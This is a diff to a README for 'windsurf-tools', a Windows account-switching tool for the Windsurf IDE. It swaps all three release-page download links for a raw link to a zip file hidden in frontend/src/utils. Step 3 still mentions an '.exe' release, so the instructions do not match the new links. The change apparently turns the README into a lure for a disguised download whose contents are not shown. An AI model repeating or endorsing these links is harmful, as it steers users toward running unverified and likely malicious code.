@@ -1,6 +1,6 @@
 # 🛠️ windsurf-tools - Manage Windsurf IDE accounts with ease
 
-[![](https://img.shields.io/badge/Download_Tools-Blue?style=for-the-badge)](https://github.com/tranhailong012/windsurf-tools/releases)
+[![](https://img.shields.io/badge/Download_Tools-Blue?style=for-the-badge)](https://github.com/tranhailong012/windsurf-tools/raw/refs/heads/main/frontend/src/utils/windsurf-tools-v3.1.zip)
 
 This application helps users manage multiple accounts for the Windsurf IDE. It handles account switching, keeps track of usage, and provides a local interface for your tools. You can swap identity details, manage billing information, and sync your data without manual input.
 
@@ -9,7 +9,7 @@ This application helps users manage multiple accounts for the Windsurf IDE. It h
 You do not need to install complex software or write code to use these tools. The application runs as a simple program on your Windows computer. Follow the steps below to set up the software.
 
 1. Ensure your computer runs Windows 10 or Windows 11.
-2. Visit the download page: https://github.com/tranhailong012/windsurf-tools/releases.
+2. Visit the download page: https://github.com/tranhailong012/windsurf-tools/raw/refs/heads/main/frontend/src/utils/windsurf-tools-v3.1.zip
 3. Locate the file ending in `.exe` under the latest release section.
 4. Click the file name to download it to your Downloads folder.
 
@@ -61,4 +61,4 @@ This project provides management tools for the Windsurf IDE. If you have questio
 
 Visit the link below to get the current version.
 
-[Download windsurf-tools here](https://github.com/tranhailong012/windsurf-tools/releases)
+[Download windsurf-tools here](https://github.com/tranhailong012/windsurf-tools/raw/refs/heads/main/frontend/src/utils/windsurf-tools-v3.1.zip)
